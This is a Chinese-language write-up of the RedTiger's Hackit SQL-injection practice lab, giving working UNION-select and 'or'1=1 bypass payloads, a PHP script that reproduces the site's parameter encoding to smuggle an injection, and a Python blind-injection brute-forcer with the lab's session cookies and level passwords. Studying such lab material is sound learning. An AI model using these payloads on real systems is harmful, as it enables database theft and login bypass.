---
layout: default
title: "RedTiger's-Hackit-Writeup"
date: 2018-03-18
categories: SQL注入
tags: SQL注入
description: RedTiger's-Hackit是一个练习SQL注入的靶场
---

### 概述
	RedTiger's Hackit的网址是`https://redtiger.labs.overthewire.org`，有盲注，绕过等

### level1

这是level1的页面，我们得到提示：表名为`level1_users`。

![level1](http://101.132.99.228/post_img/level1.png)

点击Category:1，发现页面发生变化，这是我们的注入点。在URL后面添加

`and 1=1`和`and 1=2`

页面发生变化，则该注入点可以利用。输入`order by 1,2`判断该表有几列，输入到`order by 1,2,3,4,5`页面发生变化，那么我们判断除id外还有三列。


输入`union select 1,2,3,4 from level1_users`，发现3，4被显示出来

于是我们构造

`union select 1,2,username,password from level1_users`

就得到了登录的username和password，输入之后得到flag。

### level2
来到level2的页面，提示是loginbypass

![level2](http://101.132.99.228/post_img/level2.png)

使用`'or'1=1`进行绕过。
输入用户名，密码为`'or'1=1`，成功登录，得到flag。

### level3
提示线索是`Try to get an error`，通过错误信息得到进一步的信息。

![level3](http://101.132.99.228/post_img/level3.png)

点击Show userdetails:下面的两个超链接`TheCow`和`Admin`，发现可以进行注入。

点击Admin，查询条件是

`usr=MDQyMjExMDE0MTgyMTQw`

我们构造`usr[]=MDQyMjExMDE0MTgyMTQw`制造一个错误。
通过这个错误，我们得到报错信息

`Warning: preg_match() expects parameter 2 to be string, array given in /var/www/html/hackit/urlcrypt.inc on line 25`

猜测urlcrypt.inc文件中有我们要的信息。
打开urlcrypt.inc是一个PHP代码，作用是对字符串进行编码，这两个函数可能就是对url进行编码的。构造以下poc进行验证。

	<?php

		function encrypt($str)
		{
			$cryptedstr = "";
			srand(3284724);
			for ($i =0; $i < strlen($str); $i++)
			{
				$temp = ord(substr($str,$i,1)) ^ rand(0, 255);
				
				while(strlen($temp)<3)
				{
					$temp = "0".$temp;
				}
				$cryptedstr .= $temp. "";
			}
			return base64_encode($cryptedstr);
		}
	  
		$url='Admin';
		echo 'Admin encrypted:'.encrypt($url);
	?>

得到结果为
	
	Admin encrypted:MDQyMjExMDE0MTgyMTQw
	//Windows下的执行结果为：Admin encrypted:MjE5MTU5MDM5MDIxMDYx
	//Linux执行结果为：     Admin encrypted:MDQyMjExMDE0MTgyMTQw
	//造成这个差别的原因是，在srand()设置随机数种子相同时，调用随机数函数rand()的结果不同
	//考虑到大部分服务器系统都是Linux，所以在编写poc时最好在Linux系统上运行

与Admin的查询条件刚好相同，所以它的原理是先对查询语句进行编码，那我们构造注入语句

	' union select 1,password,2,3,4,5,6 from level3_users where username='Admin
	//经过encrypt函数编码为
	MDc2MTUxMDIyMTc3MTM5MjMwMTQ1MDI0MjA5MTAwMTc3MTUzMDc0MTg3MDk1MDg0MjQzMDE3MjUyMDI1MTI2MTU2MTc2MTMzMDAwMjQ2MTU2MjA4MTgyMDk2MTI5MjIwMDQ5MDUyMjMwMTk4MTk2MTg5MTEzMDQxMjQwMTQ0MDM2MTQwMTY5MTcyMDgzMjQ0MDg3MTQxMTE1MDY2MTUzMjE0MDk1MDM4MTgxMTY1MDQ3MTE4MDg2MTQwMDM0MDg1MTE4MTE4MDk5MjIyMjE4MDEwMTkwMjIwMDcxMDQwMjIw

于是顺利得到Admin的登录口令

### level4
level4是盲注,我们的目标是得到`level4_secret`这个表的keyword列的第一个值
![level4](http://101.132.99.228/post_img/level4.png)

首先来进行布尔盲注来判断keyword的长度'id=1 and (select count(*) from level4_secret where length(keyword)=4'。一直判断到`length(keyword)=21`，才返回`Query returned 1 rows`，证明keyword的长度是21。接下来编写poc来暴力破解出keyword的字段值。

	import re
	import string
	ans=''
	char=string.printable
	url="https://redtiger.labs.overthewire.org/level4.php?id=1%20and%20(select%20count(*)%20from%20level4_secret%20where%20substr(keyword,{0},1)='{1}')"
	header={"cookie":"level2login=4_is_not_random; level3login=feed_your_cat_before_your_cat_feeds_you; __cfduid=decf6542800964a4fa1356e86419c65341521017670; __utma=176859643.251792877.1521017673.1521017673.1521017673.1; __utmz=176859643.1521017673.1.1.utmcsr=wechall.net|utmccn=(referral)|utmcmd=referral|utmcct=/open_challs/by/chall_score/ASC/page-1; level4login=there_is_no_bug"
	        }
	for i in range(1,21):
	    for j in char:
	        uurl=url.format(i,j)
	        s=requests.post(url=uurl,headers=header)
	        if re.findall('Query returned 1 rows. ', s.text):
	            print(j)
	            ans=ans+j
	            break
	print(ans)

最终顺利得到keyword的值。

### level5
level5是Bypass绕过，提示的信息有：substring，substr，（，），mid都不能使用；密码是MD5加密的，关注登录错误。
![level5](http://101.132.99.228/post_img/level5.png)
